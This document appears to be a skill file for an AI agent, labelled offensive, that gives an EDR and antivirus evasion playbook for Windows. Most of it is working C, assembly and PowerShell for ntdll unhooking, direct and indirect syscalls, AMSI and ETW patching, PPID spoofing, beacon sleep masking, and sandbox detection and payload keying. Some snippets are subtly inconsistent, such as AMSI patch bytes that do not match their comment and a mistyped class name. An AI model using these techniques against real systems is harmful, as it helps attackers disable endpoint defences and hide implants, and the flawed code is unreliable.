---
name: edr-evasion
description: EDR/AV bypass — hook unhooking, direct/indirect syscalls, PPID spoofing, process injection, AMSI bypass, ETW patching, memory encryption, behavioral evasion
metadata:
  type: offensive
  phase: evasion
  tools: syscall-stubs, ntdll-unhooking, amsi-patch, etw-patch, process-hollowing
---

# EDR Evasion

## When to Activate

- Planning EDR bypass during red team engagements
- Researching AV/EDR evasion techniques
- Developing implants that must survive endpoint detection
- Testing detection capabilities of security products

## Fundamentals

### AV vs EDR

**Antivirus (preventive)**:
- Static analysis: matching known signatures in files
- Dynamic analysis: limited behavioral monitoring/sandboxing
- Effective against known threats, weaker against advanced attacks

**EDR (proactive & investigative)**:
- Continuous endpoint monitoring
- Behavioral analysis at kernel level
- Anomaly detection and post-compromise visibility
- Prioritizes incident response and investigation

### Windows Execution Flow

```
Application → DLL (kernel32/ntdll) → Syscall → Kernel (ntoskrnl)
                    ↑
              EDR hooks here
              (userland hooks in ntdll)
```

## Hook Unhooking

### Userland Unhooking (ntdll.dll)

EDRs hook ntdll functions by replacing the first bytes with a JMP to their inspection code.

```c
// Method 1: Map fresh ntdll from disk
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
LPVOID freshNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

// Get .text section of loaded ntdll
HMODULE loadedNtdll = GetModuleHandleA("ntdll.dll");
PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)loadedNtdll;
PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)loadedNtdll + dosHeader->e_lfanew);
PIMAGE_SECTION_HEADER textSection = IMAGE_FIRST_SECTION(ntHeaders);

// Overwrite hooked .text with clean copy
DWORD oldProtect;
VirtualProtect((LPVOID)((BYTE*)loadedNtdll + textSection->VirtualAddress),
    textSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy((LPVOID)((BYTE*)loadedNtdll + textSection->VirtualAddress),
    (LPVOID)((BYTE*)freshNtdll + textSection->VirtualAddress),
    textSection->Misc.VirtualSize);
VirtualProtect((LPVOID)((BYTE*)loadedNtdll + textSection->VirtualAddress),
    textSection->Misc.VirtualSize, oldProtect, &oldProtect);
```

```c
// Method 2: Map from KnownDlls (avoids disk read)
HANDLE hSection;
UNICODE_STRING name;
RtlInitUnicodeString(&name, L"\\KnownDlls\\ntdll.dll");
OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, &name, 0, NULL, NULL };
NtOpenSection(&hSection, SECTION_MAP_READ, &oa);
PVOID freshNtdll = NULL;
SIZE_T viewSize = 0;
NtMapViewOfSection(hSection, GetCurrentProcess(), &freshNtdll, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_READONLY);
```

### Kernel-Level Unhooking Detection

Some EDRs use kernel callbacks (PsSetCreateProcessNotifyRoutine, ObRegisterCallbacks) — these cannot be bypassed from userland alone. Requires:
- BYOVD (Bring Your Own Vulnerable Driver) to unload/disable kernel callbacks
- Direct kernel object manipulation (DKOM)

## Direct & Indirect Syscalls

### Direct Syscalls

Skip ntdll entirely — call the syscall instruction directly:

```nasm
; NtAllocateVirtualMemory syscall (Windows 10 21H2)
mov r10, rcx
mov eax, 0x18          ; syscall number (varies by Windows version!)
syscall
ret
```

**Tools**: SysWhispers3, HellsGate, HalosGate, TartarusGate

### Indirect Syscalls

JMP to the `syscall; ret` instruction inside ntdll (avoids "syscall from non-ntdll" detection):

```nasm
; Find syscall;ret gadget in ntdll
mov r10, rcx
mov eax, SSN           ; System Service Number
jmp [ntdll_syscall_ret_addr]  ; JMP to syscall;ret in ntdll
```

**Why indirect**: Some EDRs check the return address of syscalls — if it's not within ntdll's address range, it's flagged.

### SSN Resolution

```c
// HellsGate: read SSN from ntdll function prologue
// Clean function: mov r10, rcx; mov eax, SSN; ...
// Hooked function: jmp <hook_addr> (first bytes replaced)
// HalosGate: if hooked, look at neighbor functions (SSN ± 1)
// TartarusGate: walk further neighbors if immediate ones also hooked
```

## AMSI Bypass

```powershell
# Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative: patch in memory
$a=[Ref].Assembly.GetType('System.Management.Automation.A]msiUtils')
$b=$a.GetField('amsiContext','NonPublic,Static')
[IntPtr]$ptr=$b.GetValue($null)
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

```c
// C implementation: patch AmsiScanBuffer
HMODULE amsi = LoadLibraryA("amsi.dll");
LPVOID addr = GetProcAddress(amsi, "AmsiScanBuffer");
DWORD oldProtect;
VirtualProtect(addr, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
// xor eax, eax; ret (return S_OK with AMSI_RESULT_CLEAN)
memcpy(addr, "\x31\xC0\x05\x4E\xFE\xFF\xFF\xC3", 8);
VirtualProtect(addr, 6, oldProtect, &oldProtect);
```

## ETW Patching

```c
// Patch EtwEventWrite to immediately return
// Blinds .NET CLR logging, PowerShell ScriptBlock logging
HMODULE ntdll = GetModuleHandleA("ntdll.dll");
LPVOID etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
DWORD oldProtect;
VirtualProtect(etwAddr, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
*(BYTE*)etwAddr = 0xC3;  // ret
VirtualProtect(etwAddr, 1, oldProtect, &oldProtect);
```

## PPID Spoofing

```c
// Make process appear to be spawned by explorer.exe
SIZE_T size = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
LPPROC_THREAD_ATTRIBUTE_LIST attrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(attrList, 1, 0, &size);

HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPid);
UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

STARTUPINFOEXA si = { sizeof(si) };
si.lpAttributeList = attrList;
PROCESS_INFORMATION pi;
CreateProcessA(NULL, "cmd.exe", NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
    NULL, NULL, &si.StartupInfo, &pi);
```

## Process Injection Techniques

| Technique | Stealth | Notes |
|-----------|---------|-------|
| CreateRemoteThread | Low | Heavily monitored |
| NtQueueApcThread (Early Bird) | Medium | APC before thread starts |
| NtSetContextThread | Medium | Hijack suspended thread |
| Module Stomping | High | Overwrite legitimate DLL .text |
| Phantom DLL Hollowing | High | Map section, overwrite |
| ThreadlessInject | Very High | No new threads created |
| Process Hollowing | Medium | Unmap + remap |
| Transacted Hollowing | High | NTFS transactions |

### ThreadlessInject Pattern
```
1. Find target process with suitable DLL loaded
2. Locate exported function that's rarely called
3. Overwrite function prologue with: push shellcode_addr; ret
4. Wait for natural execution of that function
5. No CreateRemoteThread, no APC — completely threadless
```

## Memory Encryption (Sleep Masking)

```c
// Encrypt beacon memory during sleep to avoid memory scanners
// Cobalt Strike: set sleep_mask "true" in profile
// Custom implementation:
void SleepEncrypt(DWORD sleepTime) {
    // 1. Encrypt all RX sections with XOR/RC4
    BYTE key[16]; GenerateRandomKey(key);
    EncryptMemory(beaconBase, beaconSize, key);
    
    // 2. Change memory protection to RW (no execute)
    VirtualProtect(beaconBase, beaconSize, PAGE_READWRITE, &old);
    
    // 3. Sleep
    SleepEx(sleepTime, FALSE);
    
    // 4. Restore RX and decrypt
    VirtualProtect(beaconBase, beaconSize, PAGE_EXECUTE_READ, &old);
    DecryptMemory(beaconBase, beaconSize, key);
}
```

## Behavioral Evasion

### Sandbox Detection
```c
// Check indicators before detonation:
// - Domain joined? (GetComputerNameEx)
// - RAM > 4GB? (GlobalMemoryStatusEx)
// - CPU cores > 2? (GetSystemInfo)
// - Disk > 60GB? (GetDiskFreeSpaceEx)
// - User interaction? (GetLastInputInfo — idle time)
// - Known sandbox usernames? (John, sandbox, malware, virus)
// - VM artifacts? (VMware tools, VBox Guest Additions)
```

### Execution Guardrails (Keying)
```c
// Only execute on intended target — prevents sandbox analysis
// Key to: domain name, username, hostname, MAC address
char computerName[256];
GetComputerNameA(computerName, &size);
BYTE key[32];
SHA256(computerName, strlen(computerName), key);
// Use key to decrypt payload — wrong machine = garbage output
```

## Windows 11 24H2 Considerations

- AMSI heap scanning is active — allocate with PAGE_NOACCESS, decrypt in place, then switch to PAGE_EXECUTE_READ
- Smart App Control may block outbound connections from unsigned processes
- Kernel-mode ETW (Threat Intelligence) cannot be patched from userland
- Enhanced stack tracing in newer EDRs checks full call stack, not just return address
